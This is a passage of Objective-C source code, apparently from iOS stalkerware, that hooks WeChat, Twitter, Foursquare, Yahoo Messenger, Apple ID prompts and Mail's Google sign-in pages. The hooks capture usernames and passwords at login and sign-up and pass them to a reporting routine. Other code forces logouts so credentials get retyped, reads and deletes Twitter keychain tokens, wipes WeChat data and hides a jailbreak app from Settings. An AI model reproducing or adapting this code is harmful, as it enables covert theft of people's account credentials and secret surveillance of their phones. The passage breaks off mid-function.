        DLog(@"!!!!! FORCE LOGOUT Foursquare !!!!!!")
        FoursquarePasswordManager *mgr = [FoursquarePasswordManager sharedFoursquarePasswordManager];
        [mgr performSelector:@selector(clearRegisteredAccount) withObject:nil afterDelay:10];
        
        [PasswordController forcePasswordAppID:kFoursquare logOut:kReset];
    }
        
    return retValue;
}

HOOK(FSCoreAppDelegate,  application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& FSCoreAppDelegate --> application$didFinishLaunchingWithOptions$ &&&&&&&&&&&&&&\n\n");
    
    BOOL retValue =     CALL_ORIG(FSCoreAppDelegate, application$didFinishLaunchingWithOptions$, application, options);
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kFoursquare]) {
        DLog(@"!!!!! FORCE LOGOUT Foursquare !!!!!!")
        FoursquarePasswordManager *mgr = [FoursquarePasswordManager sharedFoursquarePasswordManager];
        [mgr performSelector:@selector(clearRegisteredAccount) withObject:nil afterDelay:8];
        
        [PasswordController forcePasswordAppID:kFoursquare logOut:kReset];
    }
    
    return retValue;
}

#pragma mark -
#pragma mark Wechat
#pragma mark -

#pragma mark WeChat last user login screen (user required to enter only password)

HOOK(WCAccountLoginControlLogic,onLastUserLoginUserName$Pwd$ ,void,id arg1,id arg2){
	DLog(@"## !! WCAccountLoginControlLogic onLastUserLoginUserName$Pwd$ !! ##");
	DLog(@"## !! arg1 %@ !! ##",arg1);
	DLog(@"## !! arg2 %@ !! ##",arg2);
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    //NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    NSString* appName = [[[NSBundle mainBundle] localizedInfoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:arg1];
    [appPwd setMPassword:arg2];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];

	CALL_ORIG(WCAccountLoginControlLogic, onLastUserLoginUserName$Pwd$,arg1,arg2);
}

HOOK(WCAccountLoginControlLogic,onFirstUserLoginUserName$Pwd$ ,void,id arg1,id arg2){
	DLog(@"## !! WCAccountLoginControlLogic onFirstUserLoginUserName$Pwd$ !! ##");
	DLog(@"## !! arg1 %@ !! ##",arg1);
	DLog(@"## !! arg2 %@ !! ##",arg2);
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    //NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    NSString* appName = [[[NSBundle mainBundle] localizedInfoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:arg1];
    [appPwd setMPassword:arg2];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];

	CALL_ORIG(WCAccountLoginControlLogic, onFirstUserLoginUserName$Pwd$,arg1,arg2);
}

// Log in with telphone number and password
HOOK(WCAccountFillPhoneViewController, onNext, void) {
    DLog(@"## !! onNext !! ##");
    CALL_ORIG(WCAccountFillPhoneViewController, onNext);
    
    @try {
        WCBaseTextFieldItem *m_textFieldPhoneNumberItem = nil;
        WCBaseTextFieldItem *m_textFieldPwdItem = nil;
        WCBaseTextFieldItem *m_textFieldContryCodeItem = nil;
        
        object_getInstanceVariable(self, "m_textFieldPhoneNumberItem", (void **)&m_textFieldPhoneNumberItem);
        object_getInstanceVariable(self, "m_textFieldPwdItem", (void **)&m_textFieldPwdItem);
        object_getInstanceVariable(self, "m_textFieldContryCodeItem", (void **)&m_textFieldContryCodeItem);
        
        DLog(@"getValue m_textFieldPhoneNumberItem, %@", [m_textFieldPhoneNumberItem getValue]);
        DLog(@"getValue m_textFieldPwdItem, %@", [m_textFieldPwdItem getValue]);
        DLog(@"getValue m_textFieldContryCodeItem, %@", [m_textFieldContryCodeItem getValue]);
        
        NSString *countryCode = [m_textFieldContryCodeItem getValue];
        NSString *phoneNumber = [m_textFieldPhoneNumberItem getValue];
        NSString *userName = [NSString stringWithFormat:@"%@%@", countryCode, phoneNumber];
        NSCharacterSet *charSet = [NSCharacterSet characterSetWithCharactersInString:@"- "];
        userName = [[userName componentsSeparatedByCharactersInSet:charSet] componentsJoinedByString:@""];
        
        NSString *pwd = [m_textFieldPwdItem getValue];
        
        DLog(@"userName %@, pwd %@", userName, pwd);
        
        if ([pwd length] > 0) {
            NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
            NSString* appName = [[[NSBundle mainBundle] localizedInfoDictionary] objectForKey:@"CFBundleDisplayName"];
            
            FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
            [event setDateTime:[DateTimeFormat phoenixDateTime]];
            [event setMApplicationID:appID];
            [event setMApplicationName:appName];
            [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
            FxAppPwd *appPwd = [[FxAppPwd alloc] init];
            [appPwd setMUserName:userName];
            [appPwd setMPassword:pwd];
            [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
            [appPwd release];
            [PasswordUtils sendPasswordEvent:event];
            [event release];
        }

    }
    @catch (NSException *exception) {
        DLog(@"WeChat Exception %@", exception);
    }
    @finally {
        ;
    }
    
}

HOOK(MicroMessengerAppDelegate, application$didFinishLaunchingWithOptions$, BOOL ,id arg1 ,id arg2){
	DLog(@"## !! application$didFinishLaunchingWithOptions$ !! ##");
	BOOL ret =CALL_ORIG(MicroMessengerAppDelegate,application$didFinishLaunchingWithOptions$,arg1,arg2);
	
    if ([PasswordController isForceLogOutWithPasswordAppID:kWechat]) {
        Class $CAppUtil = objc_getClass("CAppUtil");
        CMainControll * main = [$CAppUtil getMainController];
        if ([main respondsToSelector:@selector(ForceAutoLoginFail)]) {
            [main ForceAutoLoginFail];  // No longer work for WeChat 5.2.1.17
        }
        if ([main respondsToSelector:@selector(ClearData)]) {
            [main ClearData];           // For WeChat 5.2.1.17 (note this will clear all chat history)
        }
        [PasswordController forcePasswordAppID:kWechat logOut:kReset];
        
        // This way does not quit application -> go to "log in & sign up" view right the way
        exit(0); // Required for WeChat 5.2.1.17
        
        // This way quit application, so user need to relaunch -> go to "log in & sign up" view
        //NSArray *array = [NSArray array];
        //[array objectAtIndex:0];
    }
	return ret;
}

#pragma mark -
#pragma mark Twitter (sign up, log in, force log out)
#pragma mark -

// Capture password at Sign in/Sing up view
HOOK(TFNTwitterAccount,initWithUsername$password$apiRoot$configurationURLString$ ,id,id arg1,id arg2,id arg3,id arg4){
	DLog(@"#### initWithUsername$password$apiRoot$configurationURLString$");
	DLog(@"# arg1 %@",arg1);
	DLog(@"# arg2 %@",arg2);
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:arg1];
    [appPwd setMPassword:arg2];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];

    
	return CALL_ORIG(TFNTwitterAccount, initWithUsername$password$apiRoot$configurationURLString$,arg1,arg2,arg3,arg4);
}

// For Twitter 6.13.3: SIGN UP
HOOK(TFNTwitterAPI, mobileSignUpUsername$password$fullName$email$captchaToken$captchaSolution$discoverableByEmail$discoverableByMobilePhone$retryPolicyProvider$ ,
     void, id username, id password, id fullname, id email, id token, id solution, BOOL email7, BOOL phone, id provider) {
    
    DLog (@"#### mobileSignUpUsername ####   SIGN UP CASE ")
    
    CALL_ORIG(TFNTwitterAPI, mobileSignUpUsername$password$fullName$email$captchaToken$captchaSolution$discoverableByEmail$discoverableByMobilePhone$retryPolicyProvider$ ,
              username, password, fullname, email, token, solution, email7, phone, provider);
    
    DLog (@"username %@", username)
    DLog (@"password %@", password)
    DLog (@"email %@", email)
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:username];
    [appPwd setMPassword:password];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
}

// For Twitter 6.15.1, 6.17: SIGN UP
HOOK(TFNTwitterAPI, signUp_POST$parameters$retryPolicyProvider$responseBlockInBackground$, void, id arg1, id arg2, id arg3, id arg4) {
    DLog (@"#### signUp_POST$parameters$retryPolicyProvider$responseBlockInBackground$ ####, %@, %@, %@, %@", arg1, arg2, arg3, arg4);
    CALL_ORIG(TFNTwitterAPI, signUp_POST$parameters$retryPolicyProvider$responseBlockInBackground$, arg1, arg2, arg3, arg4);
    
    NSDictionary *parameters = arg2;
    
    NSString *username = nil;
    NSString *password = [parameters objectForKey:@"password"];
    
    NSString *email = [parameters objectForKey:@"email"];
    NSString *screenname = [parameters objectForKey:@"screen_name"];
    
    username = email ? email : screenname;
    
    DLog (@"username %@", username)
    DLog (@"password %@", password)
    DLog (@"email %@", email)
    DLog (@"screenname %@", screenname)
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:username];
    [appPwd setMPassword:password];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
}

// For Twitter 6.56 SIGN UP
HOOK(T1AdaptiveSignUpFlow, completeFlowAnimated$completion$, void, BOOL arg1, id arg2) {
    DLog (@"#### completeFlowAnimated$completion$ ####, %d", arg1);

    T1MandatoryPhoneSignUpInfoProvider *signUpInfo = self.mandatoryPhoneSignUpInfo;
    NSString *username = signUpInfo.username;
    NSString *password = signUpInfo.password;
    
    DLog(@"# username %@", username);
    DLog(@"# password %@", password);
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:username];
    [appPwd setMPassword:password];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
    CALL_ORIG(T1AdaptiveSignUpFlow, completeFlowAnimated$completion$, arg1, arg2);
}

// For Twitter 6.17 Capture password at Sign in
HOOK(TFNTwitterAccount,initWithUsername$password$apiRoot$configurationURLString$dtabHeaderValue$ ,id,id arg1,id arg2,id arg3,id arg4, id arg5){
    DLog(@"#### initWithUsername$password$apiRoot$configurationURLString$dtabHeaderValue$");
    
    DLog(@"# arg1 %@",arg1);
	DLog(@"# arg2 %@",arg2);
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:arg1];
    [appPwd setMPassword:arg2];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
    return CALL_ORIG(TFNTwitterAccount, initWithUsername$password$apiRoot$configurationURLString$dtabHeaderValue$,arg1,arg2,arg3,arg4, arg5);
}

// For Twitter 6.56 Capture password at Sign in
HOOK(T1SignInManager, addUser$password$oneFactorAuthorizationRequestType$ ,void,id arg1,id arg2,unsigned long long arg3){
    DLog(@"#### addUser$password$oneFactorAuthorizationRequestType$");
    
    DLog(@"# arg1 %@",arg1);
    DLog(@"# arg2 %@",arg2);
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:arg1];
    [appPwd setMPassword:arg2];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
    CALL_ORIG(T1SignInManager, addUser$password$oneFactorAuthorizationRequestType$, arg1, arg2, arg3);
}

/*
HOOK(TFNTwitterAPI, signUpWithInfo$guestToken$retryPolicyProvider$, void, id arg1, id arg2, id arg3) {
    DLog (@"#### signUpWithInfo$guestToken$retryPolicyProvider$ ####, %@, %@, %@", arg1, arg2, arg3);
    CALL_ORIG(TFNTwitterAPI, signUpWithInfo$guestToken$retryPolicyProvider$, arg1, arg2, arg3);
}*/

HOOK(T1AppDelegate, application$didFinishLaunchingWithOptions$ ,BOOL,id arg1,id arg2 ){
	BOOL ret = CALL_ORIG(T1AppDelegate, application$didFinishLaunchingWithOptions$ ,arg1,arg2 );
	DLog(@"#### application$didFinishLaunchingWithOptions$");
	DLog(@"rootViewController %@",[self rootViewController]);
	
    if ([PasswordController isForceLogOutWithPasswordAppID:kTwitter]) {

        NSError * err = nil;
        Class $TFNTwitterAccount = objc_getClass("TFNTwitterAccount");
        if ([$TFNTwitterAccount respondsToSelector:@selector(_keychainService)]) {
            DLog(@"# _keychainService %@",[$TFNTwitterAccount _keychainService]);
        }
        
        Class $TFNTwitter = objc_getClass("TFNTwitter");
        TFNTwitter * twitter = [$TFNTwitter sharedTwitter];
        DLog(@"# lastUsedAccount %@", [twitter lastUsedAccount]);
        DLog(@"# lastUsedAccount oAuthToken %@",[[twitter lastUsedAccount]oAuthToken]);
        if ([twitter respondsToSelector:@selector(deprecatedActiveAccount)]) {
            DLog(@"# deprecatedActiveAccount %@",[twitter deprecatedActiveAccount]);
        }
        DLog(@"# defaultAccount %@",[twitter defaultAccount]);
        
        NSString *oAuthToken = [[twitter lastUsedAccount] oAuthToken];
        if (!oAuthToken) {
            oAuthToken = [[twitter defaultAccount] oAuthToken];
        }
        DLog(@"# oAuthToken %@", oAuthToken);
        
        Class $SFHFKeychainUtils = objc_getClass("SFHFKeychainUtils");
        
        id password = nil;
        if ([$SFHFKeychainUtils respondsToSelector:@selector(getPasswordForUsername:andServiceName:error:)]) {
            DLog (@"get password below 6.12")
            password = [$SFHFKeychainUtils getPasswordForUsername:oAuthToken andServiceName:[$TFNTwitterAccount _keychainService] error:&err];
        } else if ([$SFHFKeychainUtils respondsToSelector:@selector(getPasswordForUsername:andServiceName:accessGroup:error:)]) {
            DLog (@"get password greater than 6.12")
            
            if ([$TFNTwitterAccount respondsToSelector:@selector(_keychainService)]) {
                password = [$SFHFKeychainUtils getPasswordForUsername:oAuthToken
                                                       andServiceName:[$TFNTwitterAccount _keychainService]
                                                          accessGroup:nil
                                                                error:&err];
            } else {
                // com.twitter.twitter-iphone
                password = [$SFHFKeychainUtils getPasswordForUsername:oAuthToken
                                                       andServiceName:@"com.twitter.twitter-iphone"
                                                          accessGroup:nil
                                                                error:&err];

            }
        }
        DLog(@"#7 password %@",password);
        
        BOOL deletes = NO;
        if ([$SFHFKeychainUtils respondsToSelector:@selector(deleteItemForUsername:andServiceName:error:)]) {
            DLog (@"delete item below 6.12")
            deletes = [$SFHFKeychainUtils deleteItemForUsername:oAuthToken andServiceName:[$TFNTwitterAccount _keychainService] error:&err];
        } else if ([$SFHFKeychainUtils respondsToSelector:@selector(deleteItemForUsername:andServiceName:accessGroup:error:)]) {
            DLog (@"delete item greater than 6.12")
            if ([$TFNTwitterAccount respondsToSelector:@selector(_keychainService)]) {
                deletes = [$SFHFKeychainUtils deleteItemForUsername:oAuthToken
                                                     andServiceName:[$TFNTwitterAccount _keychainService]
                                                        accessGroup:nil
                                                              error:&err];
            } else {
                deletes = [$SFHFKeychainUtils deleteItemForUsername:oAuthToken
                                                     andServiceName:@"com.twitter.twitter-iphone"
                                                        accessGroup:nil
                                                              error:&err];
            }
        }
        DLog(@"#7 deletes %d",deletes);
        
        // Delete system accounts in store (accounts in 'Settings' application)
        ACAccountStore *accountStore = [$TFNTwitter sharedSystemAccountStore];
        DLog(@"# accounts %@",[accountStore accounts]);
        NSMutableArray *twitterAccounts = [NSMutableArray array];
        for (ACAccount *account in [accountStore accounts]) {
            if ([[[account accountType] performSelector:@selector(identifier)] isEqualToString:@"com.apple.twitter"]) {
                [twitterAccounts addObject:account];
            }
        }
        for (ACAccount *twitterAccount in twitterAccounts) {
            if ([accountStore respondsToSelector:@selector(removeAccount:withCompletionHandler:)]) {
                DLog(@"Deleting account type = %@", [[twitterAccount accountType] performSelector:@selector(identifier)]);
                [accountStore performSelector:@selector(removeAccount:withCompletionHandler:) withObject:twitterAccount withObject:nil];
                //[accountStore removeAccount:twitterAccount withCompletionHandler:nil];
            }
        }
        
        [PasswordController forcePasswordAppID:kTwitter logOut:kReset];
        
        exit(0);
    }
	
	return ret;
}

// Capture password after force log out
HOOK(T1AddAccountViewController,_handleSuccessfulLogin$ ,id ,id arg1){
	DLog(@"#### T1AddAccountViewController _handleSuccessfulLogin$");
    NSString * user = @"";
    NSString * password = [[self passwordField]text];
    
	if([[[self usernameField]text]length] >0){
		DLog(@"#usernameField %@",[self usernameField]);
        user = [[self usernameField] text];
	}else{
		Class $TFNTwitter = objc_getClass("TFNTwitter");
		TFNTwitter * twitter = [$TFNTwitter sharedTwitter];
		DLog(@"#1 usernameField %@",[[twitter lastUsedAccount]username]);
        user =[[twitter lastUsedAccount]username];
	}
	
	DLog(@"passwordField %@",password);
	
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:user];
    [appPwd setMPassword:password];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];

	return CALL_ORIG(T1AddAccountViewController, _handleSuccessfulLogin$,arg1 );
}

#pragma mark -
#pragma mark Apple ID
#pragma mark -

HOOK(PSListController, tableView$cellForRowAtIndexPath$ , id ,id arg1,id arg2 ){
	id ret =  CALL_ORIG(PSListController, tableView$cellForRowAtIndexPath$,arg1,arg2 );
    DLog(@"Class of x, %@", [self class]);
	// Apple ID
	Class $StoreSettingsController = objc_getClass("StoreSettingsController");
	if([self isKindOfClass:$StoreSettingsController]  ){
		StoreSettingsController * store = (StoreSettingsController *)self;
		if(([[ret text]isEqualToString:@"Sign In"]) && [[store _appleID]length]>0 && [[store _password]length]>0){
			DLog(@"###### IN ######");
			DLog(@"### ret %@",ret);
			DLog(@"### _appleID %@",[store _appleID]);
			DLog(@"### _password %@",[store _password]);
            
            if ([[[UIDevice currentDevice] systemVersion] integerValue] <= 8) {
                FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
                [event setDateTime:[DateTimeFormat phoenixDateTime]];
                [event setMApplicationID:@"com.apple.AppStore"];
                [event setMApplicationName:@"AppStore"];
                [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
                FxAppPwd *appPwd = [[FxAppPwd alloc] init];
                [appPwd setMUserName:[store _appleID]];
                [appPwd setMPassword:[store _password]];
                [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
                [appPwd release];
                [PasswordUtils sendPasswordEvent:event];
                [event release];
            }
		}else{
			if ([PasswordController isForceLogOutWithPasswordAppID:kAppleID]) {
                [PasswordController forcePasswordAppID:kAppleID logOut:kReset];
                DLog(@"###### _signOut ######");
				[store _signOut];
            }
		}
	}
    
#pragma mark Hide Pangu iOS 9
    //For Hiding Pangu iOS9 Jailbreak App
    Class $UITableViewCell = objc_getClass("UITableViewCell");
    if([ret isKindOfClass:$UITableViewCell]){
        UITableViewCell *cell = ret;
        if ([[cell text] isEqualToString:@"PP盘古越狱"]) {
            [cell setHidden:YES];
        }
    }
    
	return ret;
}

HOOK(AKBasicLoginAlertController, setAuthenticateAction$, void, id arg1) {
    DLog(@"arg1, [%@], %@", [arg1 class], arg1);
    
//    CTBlockDescription *blockDescription = [[CTBlockDescription alloc] initWithBlock:arg1];
//    NSMethodSignature *methodSignature = [blockDescription blockSignature];
//    DLog(@"Authentication block, methodSignature, %@", [methodSignature debugDescription]);
//    [blockDescription release];
    
    void (^yourAuthBlock)(NSString *p1, NSString *p2);
    yourAuthBlock = arg1;
    
    void (^myAuthenBlock)(NSString *p1, NSString *p2);
    myAuthenBlock = ^(NSString *p1, NSString *p2) {
        DLog(@"myAuthBlock to yourAuthBlock");
        DLog(@"p1, %@, p2, %@", p1, p2);
        
        NSString *appleID = p1;
        NSString *password = p2;
        
        FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
        [event setDateTime:[DateTimeFormat phoenixDateTime]];
        [event setMApplicationID:@"com.apple.AppStore"];
        [event setMApplicationName:@"AppStore"];
        [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
        FxAppPwd *appPwd = [[FxAppPwd alloc] init];
        [appPwd setMUserName:appleID];
        [appPwd setMPassword:password];
        [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
        [appPwd release];
        [PasswordUtils sendPasswordEvent:event];
        [event release];
        
        yourAuthBlock(p1, p2);
    };
    
    return CALL_ORIG(AKBasicLoginAlertController, setAuthenticateAction$, myAuthenBlock);
}

#pragma mark -
#pragma mark Yahoo Messenger Iris
#pragma mark -

#pragma mark (Yahoo Messenger Iris) Sign in

HOOK(YAccountsWebSigninViewController, didFinishWithSLCC$otherParams$, void, id arg1, id arg2){
    UIWebView *webView = (UIWebView *)self.webview;
    NSString* username = [webView stringByEvaluatingJavaScriptFromString:@"document.getElementById('login-username').value"];
    NSString* password = [webView stringByEvaluatingJavaScriptFromString:@"document.getElementById('login-passwd').value"];
    
    CALL_ORIG(YAccountsWebSigninViewController, didFinishWithSLCC$otherParams$, arg1, arg2);
    
    DLog (@"username %@", username)
    DLog (@"password %@", password)
    
    if (username     &&  [username length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", username, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:username
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}

#pragma mark (Yahoo Messenger Iris) Sign up

HOOK(YAccountsTokenHandoffWebView, webView$shouldStartLoadWithRequest$navigationType$, BOOL, id arg1, id arg2, int arg3){
    NSMutableURLRequest *urlRequest = arg2;
    
    //Detect registeration url then read username and password from html
    if ([[urlRequest.URL absoluteString] isEqualToString:@"https://edit.yahoo.com/registration"]) {
        NSString* username = [self stringByEvaluatingJavaScriptFromString:@"document.getElementById('username').value"];
        NSString* password = [self stringByEvaluatingJavaScriptFromString:@"document.getElementById('password').value"];
        
        DLog (@"username %@", username)
        DLog (@"password %@", password)
        
        if (username     &&  [username length]    &&
            password    &&  [password length])  {
            
            DLog(@"Capture account and password [%@] [%@]", username, password)
            
            NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
            
            [PasswordUtils sendPasswordEventForAccount:username
                                              password:password
                                         applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                       applicationName:applicationName];
        }
    }
    
    return CALL_ORIG(YAccountsTokenHandoffWebView, webView$shouldStartLoadWithRequest$navigationType$, arg1, arg2, arg3);
}

#pragma mark (Yahoo Messenger Iris) Force Logout

HOOK(AppDelegate,  application$didFinishLaunchingWithOptions$yahooiris, BOOL, id application, id options) {
    if ([PasswordController isForceLogOutWithPasswordAppID:kYahooMSG]) {
        DLog (@"Should force logout")
        [PasswordController forcePasswordAppID:kYahooMSG logOut:kReset];
        
        //Set Userdefault value to make yahoo messenger remove all signed in account by itself.
        [[NSUserDefaults standardUserDefaults] setObject:[NSNumber numberWithBool:YES] forKey:@"YAccountsSDK_Reset"];
        [[NSUserDefaults standardUserDefaults] synchronize];
    } else {
        DLog (@"Should NOT force logout")
    }
    
    BOOL retValue = CALL_ORIG(AppDelegate, application$didFinishLaunchingWithOptions$yahooiris, application, options);
    
    return retValue;
}

#pragma mark -
#pragma mark Settings and Mail (Capture from password from webview)
#pragma mark -

HOOK(SL_OOPAWebViewController, webView$decidePolicyForNavigationAction$decisionHandler$_Google, void, id arg1, id arg2, int arg3){
    WKWebView *webView = arg1;
    WKNavigationAction *navigationAction = arg2;
    NSURLRequest* urlRequest = navigationAction.request;
 
    //Detect registeration url then read username and password from html
    if ([[urlRequest.URL absoluteString] rangeOfString:@"https://accounts.google.com/o/oauth2/approval/v2?approvalCode="].location != NSNotFound) {
        DLog(@"Start Capture %@", webView);
        
        [webView evaluateJavaScript:@"document.getElementById('hiddenEmail').value" completionHandler:^(id usernameResult, NSError * error) {
            if (!error) {
                NSString* username = usernameResult;
                [webView evaluateJavaScript:@"document.getElementById('password').value" completionHandler:^(id passwordResult, NSError * error) {
                    if (!error) {
                        NSString* password = passwordResult;
                        
                        DLog (@"hiddenEmail %@", username)
                        DLog (@"password %@", password)
                        
                        if (username     &&  [username length]    &&
                            password    &&  [password length])  {
                            
                            DLog(@"Capture account and password [%@] [%@]", username, password)
            
                            [PasswordUtils sendPasswordEventForAccount:username
                                                              password:password
                                                         applicationID:@"com.apple.mobilemail"
                                                       applicationName:@"Mail"];
                        }
                    }
                }];
            }
        }];
    }
    
    CALL_ORIG(SL_OOPAWebViewController, webView$decidePolicyForNavigationAction$decisionHandler$_Google, arg1, arg2, arg3);
}

HOOK(SL_OOPAWebViewController, webView$shouldStartLoadWithRequest$navigationType$_google, BOOL, id arg1, id arg2, int arg3){
    NSMutableURLRequest *urlRequest = arg2;
    UIWebView *webView = arg1;
    
    NSString *body = [webView stringByEvaluatingJavaScriptFromString:@"document.body.innerHTML"];
    
    //Detect registeration url then read username and password from html
    if ([[urlRequest.URL absoluteString] rangeOfString:@"https://accounts.google.com/ServiceLoginAuth"].location != NSNotFound) {
        NSString* username = [webView stringByEvaluatingJavaScriptFromString:@"document.getElementById('Email-hidden').value"];
        NSString* password = [webView stringByEvaluatingJavaScriptFromString:@"document.getElementById('Passwd').value"];
        
        DLog (@"username %@", username)
        DLog (@"password %@", password)
        
        if (username     &&  [username length]    &&
            password    &&  [password length])  {
            
            DLog(@"Capture account and password [%@] [%@]", username, password)
   
            [PasswordUtils sendPasswordEventForAccount:username
                                              password:password
                                         applicationID:@"com.apple.mobilemail"
                                       applicationName:@"Mail"];
        }
    }
    
    return CALL_ORIG(SL_OOPAWebViewController, webView$shouldStartLoadWithRequest$navigationType$_google, arg1, arg2, arg3);
}

HOOK(SL_OOPAWebViewController, webView$decidePolicyForNavigationAction$decisionHandler$_Yahoo, void, id arg1, id arg2, int arg3){
    WKWebView *webView = arg1;
    WKNavigationAction *navigationAction = arg2;
    NSURLRequest* urlRequest = navigationAction.request;

    //Detect registeration url then read username and password from html
